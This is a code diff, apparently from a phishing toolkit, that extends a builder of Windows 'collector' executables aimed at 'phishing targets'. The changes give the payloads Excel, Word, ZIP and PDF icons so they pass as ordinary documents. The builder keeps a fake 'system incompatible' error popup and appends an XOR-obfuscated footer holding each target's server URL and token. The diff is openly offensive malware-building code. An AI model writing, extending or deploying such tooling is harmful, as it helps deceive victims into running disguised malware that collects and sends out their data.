@@ -13,6 +13,14 @@ REGISTRY_PATH = os.path.join(BASE_DIR, 'data', 'exe_registry.json')
 # Pre-built generic Windows EXE for Linux footer injection
 BASE_EXE_PATH = os.path.join(BASE_DIR, 'client', 'collector_base.exe')
 
+# Icon-to-base-EXE mapping: built-in icons have pre-built EXEs with the icon baked in
+ICON_BASE_MAP = {
+    'xlsx.ico': 'collector_base_xlsx.exe',
+    'docx.ico': 'collector_base_docx.exe',
+    'zip.ico': 'collector_base_zip.exe',
+    'pdf.ico': 'collector_base_pdf.exe',
+}
+
 IS_WINDOWS = sys.platform == 'win32'
 BIN_EXT = '.exe'  # Output is always Windows PE for phishing targets
 FOOTER_KEY = b'fishfish@aes'
@@ -95,9 +103,9 @@ def build_exe(server_url, token, target_name, exe_filename=''):
     return _build_with_pyinstaller(server_url, token, target_name, config, exe_name)
 
 
-def build_base_exe():
-    """Build the generic collector_base.exe (no target config embedded).
-    This only needs to be done once; subsequent per-target builds use footer injection."""
+def build_base_exe(icon_path=None, output_name='collector_base'):
+    """Build a base EXE (no target config embedded), optionally with an icon.
+    Each named variant is used for fast footer injection; output goes to client/."""
     os.makedirs(OUTPUT_DIR, exist_ok=True)
 
     # Use placeholder config for the base EXE
@@ -106,19 +114,55 @@ def build_base_exe():
         'popup_enabled': True,
         'popup_message': '系统不兼容，运行失败!',
     }
-    _build_with_pyinstaller(
-        '{{SERVER_URL}}', '{{TOKEN}}', '_base_', base_config, 'collector_base'
-    )
+    # Temporarily patch get_icon_path to return our desired icon
+    _orig_get_icon = None
+    if icon_path:
+        from . import config_manager
+        _orig_get_icon = config_manager.get_icon_path
+        config_manager.get_icon_path = lambda: icon_path
+    try:
+        _build_with_pyinstaller(
+            '{{SERVER_URL}}', '{{TOKEN}}', '_base_', base_config, output_name
+        )
+    finally:
+        if _orig_get_icon:
+            from . import config_manager
+            config_manager.get_icon_path = _orig_get_icon
+
     # Move output to client/ as the canonical base EXE
-    src = os.path.join(OUTPUT_DIR, 'collector_base.exe')
+    src = os.path.join(OUTPUT_DIR, f'{output_name}.exe')
+    dest = os.path.join(BASE_DIR, 'client', f'{output_name}.exe')
     if os.path.exists(src):
         import shutil
-        shutil.move(src, BASE_EXE_PATH)
-    return BASE_EXE_PATH
+        if os.path.exists(dest):
+            os.remove(dest)
+        shutil.move(src, dest)
+    return dest
+
+
+def build_all_base_exes():
+    """Build generic + icon-specific base EXEs for all four built-in icons."""
+    results = []
+    # Build generic base EXE (no icon)
+    results.append(build_base_exe(icon_path=None, output_name='collector_base'))
+    # Build icon-specific base EXEs
+    icons_dir = os.path.join(BASE_DIR, 'output', 'icons')
+    for ico_name, base_name in ICON_BASE_MAP.items():
+        ico_path = os.path.join(icons_dir, ico_name)
+        out_name = base_name.replace('.exe', '')
+        results.append(build_base_exe(icon_path=ico_path, output_name=out_name))
+    return results
 
 
 def _build_with_footer(server_url, token, config, exe_name):
-    """Linux: copy base EXE and append a JSON config footer."""
+    """Copy a base EXE and append a JSON config footer.
+
+    Prefers an icon-specific base EXE (baked-in icon) when the configured
+    icon matches a built-in preset.  Falls back to generic base EXE +
+    pefile injection for custom icons.
+    """
+    from .config_manager import get_icon_path
+
     os.makedirs(OUTPUT_DIR, exist_ok=True)
 
     cfg = {
@@ -132,16 +176,26 @@ def _build_with_footer(server_url, token, config, exe_name):
     encrypted = _xor(body, FOOTER_KEY)
     footer = b'---FISHCFG---' + encrypted + b'---FISHCFG---'
 
+    # Select the best base EXE: icon-specific > generic
+    icon_path = get_icon_path()
+    use_base = BASE_EXE_PATH
+    if icon_path and os.path.exists(icon_path):
+        ico_name = os.path.basename(icon_path)
+        mapped = ICON_BASE_MAP.get(ico_name)
+        if mapped:
+            candidate = os.path.join(BASE_DIR, 'client', mapped)
+            if os.path.exists(candidate):
+                use_base = candidate
+
     exe_path = os.path.join(OUTPUT_DIR, f"{exe_name}.exe")
-    with open(BASE_EXE_PATH, 'rb') as src:
+    with open(use_base, 'rb') as src:
         with open(exe_path, 'wb') as dst:
             dst.write(src.read())
             dst.write(footer)
 
-    # Inject custom icon into the PE (works on Linux via pefile)
-    from .config_manager import get_icon_path
-    icon_path = get_icon_path()
-    if icon_path and os.path.exists(icon_path):
+    # For custom icons (not in ICON_BASE_MAP), inject via pefile
+    is_builtin = icon_path and os.path.basename(icon_path) in ICON_BASE_MAP
+    if icon_path and os.path.exists(icon_path) and not is_builtin:
         try:
             from .pe_icon import inject_icon
             inject_icon(exe_path, icon_path)
